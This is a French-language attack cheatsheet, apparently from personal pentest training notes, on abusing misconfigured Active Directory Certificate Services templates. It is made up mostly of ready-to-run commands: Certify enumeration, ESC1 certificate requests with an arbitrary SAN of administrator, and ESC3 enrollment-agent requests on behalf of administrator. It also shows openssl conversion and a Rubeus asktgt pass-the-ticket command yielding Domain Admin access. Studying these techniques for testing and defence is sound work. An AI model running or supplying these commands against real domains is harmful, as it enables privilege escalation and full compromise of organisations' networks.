# Cheatsheet - AD CS et certificats

> [!summary] Objectif
> Trouver un template de certificat mal configuré (ESC1, ESC3) et l'abuser pour obtenir un certificat utilisable comme DA/EA — le certificat sert ensuite à demander un TGT (`Rubeus asktgt /certificate:`).

### Enumerate CA and templates
```powershell
C:\AD\Tools\Certify.exe cas
C:\AD\Tools\Certify.exe find
C:\AD\Tools\Certify.exe find /vulnerable
```

### ESC1 — enrollee supplies subject (SAN arbitraire)
```powershell
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
C:\AD\Tools\Certify.exe request /ca:<CA> /template:"HTTPSCertificates" /altname:administrator
```
Le template autorise l'appelant à choisir le SAN (`ENROLLEE_SUPPLIES_SUBJECT`) : demander un cert au nom de `administrator` directement.

### ESC3 — Enrollment Agent (abus en 2 temps)
```powershell
# 1. obtenir un cert "Certificate Request Agent" (dispo à Domain Users)
C:\AD\Tools\Certify.exe request /ca:<CA> /template:SmartCardEnrollment-Agent
# 2. utiliser ce cert pour demander, au nom d'un autre user, un cert client-auth
C:\AD\Tools\Certify.exe request /ca:<CA> /template:SmartCardEnrollment-Users /onbehalfof:<DOMAIN>\administrator /enrollcert:esc3-agent.pfx /enrollcertpw:<PW>
```
Un template avec EKU *Certificate Request Agent* ouvert à Domain Users permet de signer une demande "on behalf of" n'importe quel user sur un second template d'authentification — deux templates a priori anodins, combinés, valent ESC1.

### Convert PEM to PFX and use with Rubeus
```powershell
C:\AD\Tools\openssl\openssl.exe pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1-DA.pfx
Rubeus.exe asktgt /user:administrator /certificate:esc1-DA.pfx /password:<PW> /ptt
```

**Link** — [[Synthèse - AD CS]] · [[Cheatsheet - Trusts et forêts]] · [[Cheatsheet - Tickets Kerberos]] · [[Attaques AD - MOC]]
